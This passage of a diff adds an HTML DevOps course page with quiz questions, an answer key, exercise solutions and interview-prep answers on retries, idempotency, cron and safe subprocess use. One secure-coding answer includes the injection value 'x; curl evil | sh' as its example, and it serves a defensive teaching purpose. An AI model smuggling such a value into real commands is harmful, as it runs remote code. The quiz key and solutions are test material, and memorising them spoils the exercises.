+      <button class="q-opt" onclick="selectOpt(2,'B')"><span class="q-opt-letter">B</span> It makes the retried operation idempotent</button>
+      <button class="q-opt" onclick="selectOpt(2,'C')"><span class="q-opt-letter">C</span> It desynchronizes the clients so they stop hitting the recovering service in lock-step waves (the thundering herd)</button>
+      <button class="q-opt" onclick="selectOpt(2,'D')"><span class="q-opt-letter">D</span> It lets you safely retry non-idempotent calls</button>
+    </div>
+  </div>
+
+  <div class="quiz-card">
+    <div class="q-num">Question 3 of 5</div>
+    <div class="q-text">A retention script deletes every backup older than 7 days. The backup job silently broke 10 days ago. What happens on the next run, and which design choice prevents it?</div>
+    <div class="q-options" id="q3-opts">
+      <button class="q-opt" onclick="selectOpt(3,'A')"><span class="q-opt-letter">A</span> Every backup is now older than 7 days, so all of them are deleted — always keep the newest K files regardless of age (and default to a dry-run)</button>
+      <button class="q-opt" onclick="selectOpt(3,'B')"><span class="q-opt-letter">B</span> Nothing — deleting old files is always safe because newer ones exist</button>
+      <button class="q-opt" onclick="selectOpt(3,'C')"><span class="q-opt-letter">C</span> Only the oldest backup is deleted, because the script sorts by size</button>
+      <button class="q-opt" onclick="selectOpt(3,'D')"><span class="q-opt-letter">D</span> The script crashes, which is the safest outcome, so no change is needed</button>
+    </div>
+  </div>
+
+  <div class="quiz-card">
+    <div class="q-num">Question 4 of 5</div>
+    <div class="q-text">Write the single line that computes the backoff cap for a 0-based <code>attempt</code> — exponential growth from <code>base_delay</code> by <code>factor</code>, never exceeding <code>max_delay</code> — and assigns it to a variable named <code>cap</code>.</div>
+    <textarea class="q-code-input" id="q4-input" placeholder="cap = ..." rows="3"></textarea>
+    <button class="q-submit" onclick="checkQ4()">Check Answer</button>
+    <div class="q-feedback" id="q4-feedback"></div>
+  </div>
+
+  <div class="quiz-card">
+    <div class="q-num">Question 5 of 5</div>
+    <div class="q-text">A web form value <code>pattern</code> is used like this: <code>subprocess.run(f"grep {pattern} app.log", shell=True)</code>. What is the correct fix?</div>
+    <div class="q-options" id="q5-opts">
+      <button class="q-opt" onclick="selectOpt(5,'A')"><span class="q-opt-letter">A</span> Wrap the call in try/except so errors are caught</button>
+      <button class="q-opt" onclick="selectOpt(5,'B')"><span class="q-opt-letter">B</span> Add <code>check=True</code> so failures raise</button>
+      <button class="q-opt" onclick="selectOpt(5,'C')"><span class="q-opt-letter">C</span> Strip the double-quote characters from <code>pattern</code> before formatting</button>
+      <button class="q-opt" onclick="selectOpt(5,'D')"><span class="q-opt-letter">D</span> Pass an argument list — <code>subprocess.run(["grep", "--", pattern, "app.log"], ...)</code> — so no shell ever parses the input (<code>shlex.quote</code> is the fallback when a shell is unavoidable)</button>
+    </div>
+  </div>
+
+  <button class="quiz-submit-all" onclick="submitQuiz()">Submit Quiz →</button>
+
+  <div class="quiz-result-banner" id="quiz-result"></div>
+
+  <div class="next-chapter-card" id="next-chapter-card" style="display:none">
+    <div class="ncc-icon">☁️</div>
+    <div class="ncc-info">
+      <h3>DevOps 4: Cloud &amp; Container Ops</h3>
+      <p>Next up: reading real cloud and Kubernetes API responses — pagination, untagged or over-exposed resources, pod health, resource requests vs limits — the daily "find what's wrong in this JSON" work of an infra engineer.</p>
+    </div>
+    <a class="ncc-btn" href="do04-cloud-and-container-ops.html">Start DevOps 4 →</a>
+  </div>
+</div><!-- end quiz -->
+
+<div class="interview-section" id="sec-interview">
+  <div class="interview-intro">
+    <h2>💼 Automation &amp; Resilience — Interview Prep</h2>
+    <p>12 questions that DevOps, SRE and platform interviewers ask about production scripting — the "how do you make this safe to run unattended?" angle. Click a question to reveal what a strong answer sounds like.</p>
+  </div>
+
+  <div class="iq-card" onclick="this.classList.toggle('open')">
+    <div class="iq-q">What does it mean for a script to be idempotent, and how do you make one?<span class="iq-arrow">▶</span></div>
+    <div class="iq-a"><div class="iq-a-inner">Running it twice leaves the system in exactly the state running it once would. You get there by expressing <em>desired end state</em> instead of actions: <code>mkdir(exist_ok=True)</code>, "ensure this line is present," "create the user unless it exists," <code>UPDATE ... SET status='done'</code> rather than <code>counter += 1</code>. It matters because automation gets re-run — after a crash, by a retry, by cron overlapping, by a human who isn't sure the last run finished. A strong answer names a non-idempotent trap (appending to a file, sending an email, incrementing a counter) and the fix (check-then-act under a lock, an idempotency key, or a state file recording what's already done).</div></div>
+  </div>
+
+  <div class="iq-card" onclick="this.classList.toggle('open')">
+    <div class="iq-q">What should you retry, and what should you never retry?<span class="iq-arrow">▶</span></div>
+    <div class="iq-a"><div class="iq-a-inner">Retry <em>transient</em> failures: connection resets, timeouts, HTTP 429/502/503/504. Never retry errors that cannot fix themselves — 400/401/403/404, validation errors, bugs — you just repeat the failure more slowly and add load. The second axis is safety: only retry operations that are idempotent (GET, PUT, DELETE by id), or make them so with an idempotency key, because a timeout does not tell you whether the server did the work. Always bound the attempts and the total time, and put a timeout on each attempt, or the retry loop itself becomes the outage.</div></div>
+  </div>
+
+  <div class="iq-card" onclick="this.classList.toggle('open')">
+    <div class="iq-q">Why exponential backoff <em>with jitter</em>? What is a thundering herd?<span class="iq-arrow">▶</span></div>
+    <div class="iq-a"><div class="iq-a-inner">Exponential backoff (1s, 2s, 4s… capped) gives a struggling dependency progressively more breathing room. Without jitter, every client that failed at the same moment retries at the same moments — synchronized waves that can keep a recovering service down. Jitter randomizes each wait so retries spread out. The usual formulation is <em>full jitter</em>: sleep <code>random.uniform(0, min(cap, base * 2**attempt))</code>. Bonus points: mention that the failure is often correlated (a deploy or a network blip hits everyone at once), which is exactly when jitter matters, and that a retry budget or circuit breaker stops retries from amplifying an outage.</div></div>
+  </div>
+
+  <div class="iq-card" onclick="this.classList.toggle('open')">
+    <div class="iq-q">Why is <code>subprocess.run(cmd, shell=True)</code> with user-influenced input dangerous, and how do you run commands safely?<span class="iq-arrow">▶</span></div>
+    <div class="iq-a"><div class="iq-a-inner">With <code>shell=True</code> the string goes through <code>/bin/sh</code>, so metacharacters — <code>;</code>, <code>&amp;&amp;</code>, backticks, <code>$( )</code>, newlines — are interpreted. A value like <code>x; curl evil | sh</code> becomes arbitrary command execution as your script's user. Safe pattern: pass a <em>list</em> (<code>['grep', '--', pattern, path]</code>) so there is no shell, plus <code>check=True</code>, <code>timeout=...</code> and <code>capture_output=True</code>. The <code>--</code> stops a value that starts with <code>-</code> being read as an option (argument injection). If you truly need a shell, <code>shlex.quote()</code> every interpolated value, and never build commands from untrusted data.</div></div>
+  </div>
+
+  <div class="iq-card" onclick="this.classList.toggle('open')">
+    <div class="iq-q">How do you update a config file so a crash or a concurrent reader never sees a half-written file?<span class="iq-arrow">▶</span></div>
+    <div class="iq-a"><div class="iq-a-inner">Write the new content to a temporary file in the <em>same directory</em> (same filesystem), flush and <code>fsync</code> it if durability matters, then <code>os.replace(tmp, target)</code>. A rename within one filesystem is atomic on POSIX, so readers see either the complete old file or the complete new one. The same-filesystem detail is the follow-up interviewers probe: a rename across filesystems degrades to copy-then-delete and is not atomic. Also mention that atomic replace protects readers but does not serialize two writers — for that you add a lock, or a version check.</div></div>
+  </div>
+
+  <div class="iq-card" onclick="this.classList.toggle('open')">
+    <div class="iq-q">What is a zombie process and how can a Python script create one?<span class="iq-arrow">▶</span></div>
+    <div class="iq-a"><div class="iq-a-inner">A zombie is a process that has exited but whose exit status has not been collected by its parent, so it keeps a process-table entry (state <code>Z</code> in <code>ps</code>). A script creates them by starting children with <code>subprocess.Popen</code> (or <code>os.fork</code>) and never calling <code>wait()</code>/<code>communicate()</code>/<code>poll()</code>. A few are harmless; thousands exhaust the PID table. Fix: use <code>subprocess.run</code> (waits for you), or always <code>wait()</code>. Long-running daemons in containers add another wrinkle — PID 1 must reap orphaned children, which is why images use an init like <code>tini</code> or Docker's <code>--init</code>.</div></div>
+  </div>
+
+  <div class="iq-card" onclick="this.classList.toggle('open')">
+    <div class="iq-q">What do exit codes mean, and why should a script return them properly?<span class="iq-arrow">▶</span></div>
+    <div class="iq-a"><div class="iq-a-inner">Zero is success; non-zero is failure. Schedulers, CI systems, Kubernetes Jobs and systemd all key off the exit status, not your output — a script that logs "backup failed" and exits 0 is invisible to alerting. Conventions: 1 for a general error, 2 for a usage error (argparse does this), 126/127 for "not executable / not found", and 128+N when killed by signal N (137 = SIGKILL, often the OOM killer; 143 = SIGTERM). In Python: structure the script as <code>def main(argv=None) -&gt; int</code> and finish with <code>sys.exit(main())</code>, so tests can call <code>main([...])</code> and assert on the returned code.</div></div>
+  </div>
+
+  <div class="iq-card" onclick="this.classList.toggle('open')">
+    <div class="iq-q">You have to write a script that deletes old files. How do you make that safe?<span class="iq-arrow">▶</span></div>
+    <div class="iq-a"><div class="iq-a-inner">Layers: (1) compute a <em>plan</em> as a pure function and default to a <strong>dry-run</strong>, requiring an explicit flag to delete; (2) only touch files that match a strict pattern, and report what was skipped rather than deleting unknown files; (3) resolve paths and verify each target is inside the intended root before unlinking; (4) combine the age rule with a keep-newest-K rule so a broken producer can't cause a total wipe; (5) inject the clock so behavior is testable; (6) log every decision with its inputs; (7) make it idempotent and lock against concurrent runs. Being able to list these unprompted is what distinguishes someone who has been paged for a cleanup script gone wrong.</div></div>
+  </div>
+
+  <div class="iq-card" onclick="this.classList.toggle('open')">
+    <div class="iq-q">How should a long-running worker handle SIGTERM, for example inside Kubernetes?<span class="iq-arrow">▶</span></div>
+    <div class="iq-a"><div class="iq-a-inner">On pod termination Kubernetes sends SIGTERM, waits <code>terminationGracePeriodSeconds</code> (default 30s), then sends SIGKILL, which cannot be caught. So the handler should just set a flag; the main loop finishes the current unit of work, releases locks, flushes logs and exits 0. Do not do heavy work inside the signal handler itself (it runs between bytecodes, and only in the main thread). Related details worth naming: make the process PID 1's signal-aware (or use an init), stop accepting new work first, and use <code>preStop</code> hooks or readiness gating so the load balancer stops sending traffic before shutdown starts.</div></div>
+  </div>
+
+  <div class="iq-card" onclick="this.classList.toggle('open')">
+    <div class="iq-q">What are the classic cron gotchas?<span class="iq-arrow">▶</span></div>
+    <div class="iq-a"><div class="iq-a-inner">(1) When both day-of-month and day-of-week are restricted, cron fires when <em>either</em> matches, so <code>0 0 13 * 5</code> runs every Friday <em>and</em> every 13th. (2) Time zone: cron uses the host's local time, so a 02:30 job is skipped or doubled around daylight-saving changes — run servers in UTC. (3) Overlap: a run that outlasts its interval collides with the next one; guard with a lock or <code>concurrencyPolicy: Forbid</code> in Kubernetes. (4) Missed runs are not replayed. (5) Sunday is 0 (and 7), and the minimal cron environment has a tiny <code>PATH</code> and no shell profile, so scripts that work interactively fail there — use absolute paths.</div></div>
+  </div>
+
+  <div class="iq-card" onclick="this.classList.toggle('open')">
+    <div class="iq-q">Threads, processes or asyncio for checking 500 hosts? What about compressing 500 files?<span class="iq-arrow">▶</span></div>
+    <div class="iq-a"><div class="iq-a-inner">Checking hosts is I/O bound: the thread spends its time waiting on the network, and CPython releases the GIL while waiting, so a <code>ThreadPoolExecutor</code> (bounded, e.g. 20–50 workers) or asyncio gives large speed-ups; asyncio scales to more concurrent connections with less memory but needs async-aware libraries. Compressing or hashing files is CPU bound: under the GIL threads don't help, so use <code>ProcessPoolExecutor</code> (or <code>multiprocessing</code>), which sidesteps the GIL with separate interpreters. Always cap concurrency — an unbounded pool can exhaust file descriptors, trip rate limits, or hammer the very systems you're checking.</div></div>
+  </div>
+
+  <div class="iq-card" onclick="this.classList.toggle('open')">
+    <div class="iq-q">How would you find duplicate files across a very large directory tree efficiently?<span class="iq-arrow">▶</span></div>
+    <div class="iq-a"><div class="iq-a-inner">Never hash everything up front. Stage it: (1) group by file size — a <code>stat</code> is cheap and files of different sizes cannot be equal; (2) for size groups with 2+ files, hash a small prefix (say the first 4&nbsp;KB) to eliminate most non-matches cheaply; (3) full SHA-256 only for prefix matches, read in fixed-size chunks so memory stays constant; (4) optionally a final byte-for-byte compare before deleting anything, since the cost of a false positive is data loss. Mention hard links (same inode is not a duplicate to reclaim) and symlinks (don't follow them blindly).</div></div>
+  </div>
+
+  <div style="display:flex;gap:12px;margin-top:24px">
+    <button class="next-btn" onclick="showSection('quiz')">🧪 Back to Quiz</button>
+  </div>
+</div><!-- end interview -->
+
+  </div><!-- main-content -->
+</div><!-- content -->
+
+<div id="console-dock">
+  <div class="cd-header">
+    <div class="cd-title cd-loading" id="cd-title"><div class="cd-dot"></div>Python Console</div>
+    <div class="cd-status" id="cd-status">Loading Python (Pyodide)...</div>
+  </div>
+  <div class="cd-out" id="cd-out"></div>
+  <div class="cd-input-row">
+    <div class="cd-prompt">>>></div>
+    <textarea id="cd-input" placeholder="Type Python here, Ctrl+Enter to run" rows="2"
+      onkeydown="if(event.ctrlKey&&event.key==='Enter'){event.preventDefault();runConsole()}"></textarea>
+    <button class="cd-clear" onclick="clearConsole()">Clear</button>
+    <button class="cd-run" onclick="runConsole()">Run ▶</button>
+  </div>
+</div>
+
+</div><!-- shell -->
+
+<script src="https://cdn.jsdelivr.net/pyodide/v0.26.4/full/pyodide.js"></script>
+
+<script>
+let pyReady = false;
+let pyodide = null;
+let quizAnswers = {1:null,2:null,3:null,4:null,5:null};
+let quizDone = false;
+
+function pyodideFailed(){
+  document.getElementById('cd-status').textContent='Offline — need internet to load Python (first load only)';
+  document.getElementById('cd-title').className='cd-title cd-err';
+  document.getElementById('py-chip').innerHTML='🔴 <span>Python offline</span>';
+}
+async function initPyodide(){
+  try{
+    if(typeof loadPyodide==='undefined'){pyodideFailed();return;}
+    pyodide = await loadPyodide({ indexURL: 'https://cdn.jsdelivr.net/pyodide/v0.26.4/full/' });
+    pyReady = true;
+    document.getElementById('cd-status').textContent='Python 3.11 ready ✓';
+    document.getElementById('cd-title').className='cd-title';
+    document.getElementById('py-chip').innerHTML='🟢 <span>Python Ready</span>';
+    clog('# Python ready — Ctrl+Enter to run code','info');
+    clog('# Standard library only — pathlib, hashlib, tempfile, argparse and logging all run for real here','info');
+  }catch(e){
+    console.error(e);
+    pyodideFailed();
+  }
+}
+initPyodide();
+
+function cleanPyError(msg){
+  const lines=msg.trim().split('\n').filter(l=>l.trim());
+  for(let i=lines.length-1;i>=0;i--){
+    if(/[A-Za-z]+Error:|Exception:/.test(lines[i])) return lines[i].trim();
+  }
+  return lines[lines.length-1]||'Error';
+}
+async function runPy(code){
+  if(!pyReady)return{ok:false,out:'',err:'Python not loaded — check your internet connection'};
+  let out='';
+  pyodide.setStdout({ batched:(s)=>{ out+=s+'\n'; } });
+  pyodide.setStderr({ batched:(s)=>{ out+=s+'\n'; } });
+  try{
+    await pyodide.loadPackagesFromImports(code);
+    await pyodide.runPythonAsync(code);
+    return{ok:true,out};
+  }catch(e){
+    return{ok:false,out,err:cleanPyError(e.message||e.toString())};
+  }finally{
+    pyodide.setStdout({});
+    pyodide.setStderr({});
+  }
+}
+
+function clog(text,type='out'){
+  const el=document.getElementById('cd-out');
+  const d=document.createElement('div');
+  d.className='cl '+type;
+  d.textContent=text;
+  el.appendChild(d);
+  el.scrollTop=el.scrollHeight;
+}
+window.clearConsole=()=>{
+  document.getElementById('cd-out').innerHTML='';
+  clog('# Cleared','info');
+};
+window.runConsole=async()=>{
+  const code=document.getElementById('cd-input').value.trim();
+  if(!code)return;
+  if(!pyReady){clog('Python not loaded yet','info');return;}
+  clog('>>> '+code.split('\n')[0]+(code.includes('\n')?' [...]':''),'info');
+  const{ok,out,err}=await runPy(code);
+  if(out)out.split('\n').forEach(l=>{if(l!==undefined&&l!=='')clog(l,ok?'out':'err');});
+  if(!ok&&err)err.split('\n').forEach(l=>{if(l.trim())clog(l,'err');});
+};
+window.runToConsole=function(btn){
+  const code=btn.closest('.code-block').querySelector('.cb-code').textContent;
+  document.getElementById('cd-input').value=code;
+  runConsole();
+};
+
+function showSection(name){
+  ['lesson','practice','project','quiz','interview'].forEach(s=>{
+    document.getElementById('sec-'+s).classList.toggle('show',s===name);
+    const tabEl=document.getElementById('tab-'+s);
+    if(tabEl) tabEl.classList.toggle('active',s===name);
+    const sbEl=document.getElementById('sb-'+s);
+    if(sbEl) sbEl.classList.toggle('active',s===name);
+  });
+  window.scrollTo(0,0);
+  document.getElementById('main-content').scrollTop=0;
+}
+
+const EXERCISES = {
+  1:{
+    checks:["2.4 mb", "925.8 kb", "700 b", "120 b", "total"],
+    checkFn:(full)=>{
+      const lines=full.split('\n').map(l=>l.trim());
+      const want=[/^logs\s+2\.4 MB$/,/^cache\s+925\.8 KB$/,/^etc\s+700 B$/,/^README\s+120 B$/,/^TOTAL\s+3\.3 MB$/];
+      let last=-1;
+      for(const re of want){
+        const i=lines.findIndex((l,idx)=>idx>last&&re.test(l));
+        if(i<0) return false;
+        last=i;
+      }
+      return true;
+    },
+    hint:"totals[top] = totals.get(top, 0) + p.stat().st_size, then sorted(totals.items(), key=lambda kv: kv[1], reverse=True). p.relative_to(root).parts[0] is the first path component — for the loose README file that is 'README' itself.",
+    solution:`import os, tempfile
+from pathlib import Path
+
+def make_tree(root, spec):
+    for rel, (data, mtime) in spec.items():
+        p = root / rel
+        p.parent.mkdir(parents=True, exist_ok=True)
+        p.write_bytes(data)
+        os.utime(p, (mtime, mtime))
+
+def human(n):
+    for unit in ('B', 'KB', 'MB'):
+        if n < 1024 or unit == 'MB':
+            return f'{n} B' if unit == 'B' else f'{n:.1f} {unit}'
+        n /= 1024
+
+root = Path(tempfile.mkdtemp())
+make_tree(root, {
+    'logs/app.log':     (b'a' * 3000, 0),
+    'logs/app.log.1':   (b'a' * 2500000, 0),
+    'cache/thumbs.bin': (b'b' * 900000, 0),
+    'cache/idx.bin':    (b'b' * 48000, 0),
+    'etc/app.yaml':     (b'c' * 700, 0),
+    'README':           (b'd' * 120, 0),
+})
+
+totals = {}
+for p in root.rglob('*'):
+    if p.is_file():
+        top = p.relative_to(root).parts[0]
+        totals[top] = totals.get(top, 0) + p.stat().st_size
+
+for name, size in sorted(totals.items(), key=lambda kv: kv[1], reverse=True):
+    print(f'{name:<8}{human(size):>10}')
+print(f'{"TOTAL":<8}{human(sum(totals.values())):>10}')`
+  },
+  2:{
+    checks:["group 1: ['a/photo.jpg', 'b/photo (1).jpg', 'c/photo-final.jpg']", "group 2: ['a/report.pdf', 'b/report-copy.pdf']", "files hashed: 6 of 7", "reclaimable bytes: 4500"],
+    hint:"Group p.stat().st_size -> list of paths. Skip sizes with a single file. For the rest, hashlib.sha256 fed by f.read(65536) in a loop, grouped by hexdigest. Reclaimable = size of one file * (len(group) - 1), summed over groups.",
+    solution:`import hashlib, os, tempfile
+from pathlib import Path
+
+def make_tree(root, spec):
+    for rel, (data, mtime) in spec.items():
+        p = root / rel
+        p.parent.mkdir(parents=True, exist_ok=True)
+        p.write_bytes(data)
+        os.utime(p, (mtime, mtime))
+
+root = Path(tempfile.mkdtemp())
+make_tree(root, {
+    'a/report.pdf':        (b'PDF-CONTENT-1' * 100, 0),
+    'b/report-copy.pdf':   (b'PDF-CONTENT-1' * 100, 0),
+    'c/notes.txt':         (b'meeting notes', 0),
+    'a/photo.jpg':         (b'JPEGDATA' * 200, 0),
+    'b/photo (1).jpg':     (b'JPEGDATA' * 200, 0),
+    'c/photo-final.jpg':   (b'JPEGDATA' * 200, 0),
+    'c/other.jpg':         (b'JPEGDATB' * 200, 0),
+})
+
+def sha256_of(path, chunk_size=65536):
+    h = hashlib.sha256()
+    with open(path, 'rb') as f:
+        while chunk := f.read(chunk_size):
+            h.update(chunk)
+    return h.hexdigest()
+
+by_size = {}
+for p in root.rglob('*'):
+    if p.is_file():
+        by_size.setdefault(p.stat().st_size, []).append(p)
+
+hashed, groups = 0, {}
+for size, paths in by_size.items():
+    if len(paths) < 2:
+        continue
+    for p in paths:
+        hashed += 1
+        groups.setdefault(sha256_of(p), []).append(p.relative_to(root).as_posix())
+
+dupes = sorted(sorted(g) for g in groups.values() if len(g) > 1)
+for i, group in enumerate(dupes, 1):
+    print(f'Group {i}: {group}')
+reclaimable = sum((root / g[0]).stat().st_size * (len(g) - 1) for g in dupes)
+print(f'Files hashed: {hashed} of 7')
+print(f'Reclaimable bytes: {reclaimable}')`
+  },
+  3:{
+    checks:["keep  : ['app-2025-03-14.tar.gz', 'app-2025-03-13.tar.gz', 'app-2025-03-10.tar.gz']", "delete: ['app-2025-03-01.tar.gz', 'app-2025-02-28.tar.gz', 'app-2025-01-15.tar.gz', 'app-2024-12-25.tar.gz']", "stalled keep  : ['app-2025-01-10.tar.gz', 'app-2025-01-09.tar.gz']", "stalled delete: ['app-2025-01-08.tar.gz', 'app-2024-12-01.tar.gz']"],
+    hint:"Sort by parsed date descending, compute cutoff = now - timedelta(days=keep_days), then walk with enumerate: if i < keep_last or date >= cutoff -> keep, else delete.",
+    solution:`import re
+from datetime import datetime, timedelta, timezone
+
+NOW = datetime(2025, 3, 15, 12, 0, tzinfo=timezone.utc)
+KEEP_DAYS, KEEP_LAST = 10, 2
+
+names = ['app-2025-03-14.tar.gz', 'app-2025-03-01.tar.gz', 'app-2025-02-28.tar.gz',
+         'app-2025-03-10.tar.gz', 'app-2025-01-15.tar.gz', 'app-2025-03-13.tar.gz',
+         'app-2024-12-25.tar.gz']
+stalled = ['app-2025-01-10.tar.gz', 'app-2025-01-09.tar.gz', 'app-2025-01-08.tar.gz',
+           'app-2024-12-01.tar.gz']
+
+def backup_date(name):
+    m = re.search(r'(\\d{4}-\\d{2}-\\d{2})', name)
+    return datetime.strptime(m.group(1), '%Y-%m-%d').replace(tzinfo=timezone.utc)
+
+def plan_retention(files, now, keep_days, keep_last):
+    newest_first = sorted(files, key=backup_date, reverse=True)
+    cutoff = now - timedelta(days=keep_days)
+    keep, delete = [], []
+    for i, name in enumerate(newest_first):
+        if i < keep_last or backup_date(name) >= cutoff:
+            keep.append(name)
+        else:
+            delete.append(name)
+    return keep, delete
+
+keep, delete = plan_retention(names, NOW, KEEP_DAYS, KEEP_LAST)
+print(f'Keep  : {keep}')
+print(f'Delete: {delete}')
+keep, delete = plan_retention(stalled, NOW, KEEP_DAYS, KEEP_LAST)
+print(f'Stalled keep  : {keep}')
+print(f'Stalled delete: {delete}')`
+  },
+  4:{
+    checks:["scenario 1: result=ok calls=3 delays=[0.5, 1.0]", "scenario 2: connectionerror after 5 attempts, delays=[0.5, 1.0, 2.0, 3.0]", "scenario 3: valueerror not retried, calls=1, delays=[]"],
+    hint:"for attempt in range(max_attempts): try: return fn(...) except retry_on: if attempt == max_attempts - 1: raise; sleep(jitter(min(max_delay, base_delay * factor ** attempt))). Scenario 2 shows the cap: the 4th delay would be 4.0 but max_delay is 3.0.",
+    solution:`import functools, time
+
+def retry(max_attempts=4, base_delay=1.0, factor=2.0, max_delay=30.0,
+          jitter=lambda cap: cap, sleep=None, retry_on=(ConnectionError, TimeoutError)):
+    sleep = sleep or time.sleep
+    def decorator(fn):
+        @functools.wraps(fn)
+        def wrapper(*args, **kwargs):
+            for attempt in range(max_attempts):
+                try:
+                    return fn(*args, **kwargs)
+                except retry_on:
+                    if attempt == max_attempts - 1:
+                        raise
+                    cap = min(max_delay, base_delay * factor ** attempt)
+                    sleep(jitter(cap))
+        return wrapper
+    return decorator
+
+def run_scenarios(retry):
+    delays, calls = [], {'n': 0}
+
+    @retry(max_attempts=4, base_delay=0.5, factor=2.0, max_delay=3.0, sleep=delays.append)
+    def flaky():
+        calls['n'] += 1
+        if calls['n'] < 3:
+            raise ConnectionError('reset')
+        return 'ok'
+    print(f'Scenario 1: result={flaky()} calls={calls["n"]} delays={delays}')
+
+    delays2, calls2 = [], {'n': 0}
+
+    @retry(max_attempts=5, base_delay=0.5, factor=2.0, max_delay=3.0, sleep=delays2.append)
+    def always_down():
+        calls2['n'] += 1
+        raise ConnectionError('still down')
+    try:
+        always_down()
+    except ConnectionError as e:
+        print(f'Scenario 2: {type(e).__name__} after {calls2["n"]} attempts, delays={delays2}')
+
+    delays3, calls3 = [], {'n': 0}
+
+    @retry(max_attempts=5, sleep=delays3.append)
+    def bad_request():
+        calls3['n'] += 1
+        raise ValueError('bad payload')
+    try:
+        bad_request()
+    except ValueError as e:
+        print(f'Scenario 3: {type(e).__name__} not retried, calls={calls3["n"]}, delays={delays3}')
+
+run_scenarios(retry)`
+  },
+  5:{
+    checks:["*/15 9-17 * * 1-5  mon 2025-03-17 09:45 -> true", "*/15 9-17 * * 1-5  sat 2025-03-15 09:45 -> false", "0 3 * * 0          sun 2025-03-16 03:00 -> true", "0 3 * * 7          sun 2025-03-16 03:00 -> true", "0 0 13 * 5         fri 2025-06-06 00:00 -> true", "5/20 * * * *       mon 2025-03-17 10:45 -> true", "5/20 * * * *       mon 2025-03-17 10:15 -> false"],
+    hint:"cron_dow = (dt.weekday() + 1) % 7. dow_ok = field_matches(dow, cron_dow, 0, 7) or (cron_dow == 0 and field_matches(dow, 7, 0, 7)). If dom != '*' and dow != '*': return dom_ok or dow_ok, else return dom_ok and dow_ok.",
+    solution:`from datetime import datetime
+
+def field_matches(field, value, lo, hi):
+    for part in field.split(','):
+        step, has_step = 1, '/' in part
+        if has_step:
+            part, step = part.split('/')
+            step = int(step)
+        if part == '*':
+            start, end = lo, hi
+        elif '-' in part:
+            start, end = map(int, part.split('-'))
+        else:
+            start = int(part)
+            end = hi if has_step else start        # "5/20" means 5-hi every 20
+        if start <= value <= end and (value - start) % step == 0:
+            return True
+    return False
+
+def cron_matches(expr, dt):
+    minute, hour, dom, month, dow = expr.split()
+    if not (field_matches(minute, dt.minute, 0, 59) and field_matches(hour, dt.hour, 0, 23)
+            and field_matches(month, dt.month, 1, 12)):
+        return False
+    cron_dow = (dt.weekday() + 1) % 7                     # cron: Sunday = 0; Python: Monday = 0
+    dom_ok = field_matches(dom, dt.day, 1, 31)
+    dow_ok = field_matches(dow, cron_dow, 0, 7) or (cron_dow == 0 and field_matches(dow, 7, 0, 7))
+    if dom != '*' and dow != '*':
+        return dom_ok or dow_ok                           # BOTH restricted => OR, not AND (classic cron gotcha)
+    return dom_ok and dow_ok
+
+cases = [
+    ('*/15 9-17 * * 1-5', datetime(2025, 3, 17, 9, 45)),
+    ('*/15 9-17 * * 1-5', datetime(2025, 3, 15, 9, 45)),
+    ('0 3 * * 0',         datetime(2025, 3, 16, 3, 0)),
+    ('0 3 * * 7',         datetime(2025, 3, 16, 3, 0)),
+    ('0 0 13 * 5',        datetime(2025, 6, 6, 0, 0)),
+    ('5/20 * * * *',      datetime(2025, 3, 17, 10, 45)),
+    ('5/20 * * * *',      datetime(2025, 3, 17, 10, 15)),
+]
+for expr, dt in cases:
+    print(f'{expr:<18} {dt:%a %Y-%m-%d %H:%M} -> {cron_matches(expr, dt)}')`
+  }
+};
+
+window.runExercise=async function(n){
+  const code=document.getElementById(`ex${n}-code`).value.trim();
+  if(!code||!pyReady)return;
+  const outEl=document.getElementById(`ex${n}-out`);
+  const resEl=document.getElementById(`ex${n}-result`);
+  outEl.textContent='Running...';outEl.className='ex-output show';
+  resEl.className='ex-result';resEl.style.display='none';
+  const{ok,out,err}=await runPy(code);
+  const full=(out||'')+((!ok&&err)?'\n'+err:'');
+  outEl.textContent=full||(ok?'(no output)':'Error');
+  outEl.className='ex-output show '+(ok?'ok':'err');
+
+  const ex=EXERCISES[n];
+  let passed=ok;
+  if(passed&&ex.checks){
+    passed=ex.checks.every(c=>full.toLowerCase().includes(c.toLowerCase()));
+  }
+  if(passed&&ex.checkFn){
+    passed=ex.checkFn(full);
+  }
+  resEl.style.display='flex';
+  resEl.className='ex-result show '+(passed?'pass':'fail');
+  if(passed){
+    resEl.textContent='✅ Correct! Well done.';
+    spark();
+  }else{
+    resEl.textContent=ok?'❌ Output doesn\'t match — check the task requirements':'❌ Python error — fix it and try again';
+  }
+};
+
+window.showExHint=function(n){
+  alert('💡 Hint:\n\n'+EXERCISES[n].hint);
+};
+window.showSolution=function(n){
+  if(confirm('Show the solution? Try harder first! 😊')){
+    document.getElementById(`ex${n}-code`).value=EXERCISES[n].solution;
+  }
+};
+window.resetEx=function(n){
+  document.getElementById(`ex${n}-out`).className='ex-output';
+  document.getElementById(`ex${n}-result`).className='ex-result';
+};
+
+window.runProject=async function(){
+  const code=document.getElementById('project-editor').value;
+  const out=document.getElementById('project-output');
+  const res=document.getElementById('project-result');
+  out.textContent='Running...';out.className='pe-output';
+  res.style.display='none';
+  const{ok,out:o,err}=await runPy(code);
+  const full=(o||'')+((!ok&&err)?'\n'+err:'');
+  out.textContent=full||(ok?'(no output — add print() statements)':'Error');
+  out.className='pe-output'+(full?' has-output':'');
+
+  const checks=["guard: keep_last must be >= 1", "dry run would delete db-2025-03-01.tar.gz", "dry run would delete db-2025-02-14.tar.gz", "dry run would delete db-2025-01-30.tar.gz", "dry run would delete files-2025-01-15.tar.gz", "dry run would delete files-2024-12-01.tar.gz", "dry runs identical: true", "nothing deleted yet: true", "deleted: 5", "nothing to do", "second real run deleted: 0", "remaining: ['readme.txt', 'db-2025-03-12.tar.gz', 'db-2025-03-13.tar.gz', 'db-2025-03-14.tar.gz', 'files-2025-02-01.tar.gz', 'files-2025-03-14.tar.gz']", "skipped: ['readme.txt']"];
+  const passed=ok&&checks.every(c=>full.toLowerCase().includes(c));
+  res.style.display='flex';res.className='pe-result show '+(passed?'pass':'fail');
+  if(passed){
+    res.textContent='✅ Capstone complete! All required elements present.';
+    spark();
+  }else if(!ok){
+    res.textContent='❌ Python error — fix it and run again';
+  }else{
+    res.textContent='❌ Missing some required values — check the checklist above';
+  }
+};
+
+const CORRECT={1:'B',2:'C',3:'A',5:'D'};
+
+window.selectOpt=function(q,opt){
+  if(quizDone)return;
+  quizAnswers[q]=opt;
+  document.querySelectorAll(`#q${q}-opts .q-opt`).forEach((b,i)=>{
+    const letter=String.fromCharCode(65+i);
+    b.classList.toggle('selected',letter===opt);
+  });
+};
+
+window.checkQ4=function(){
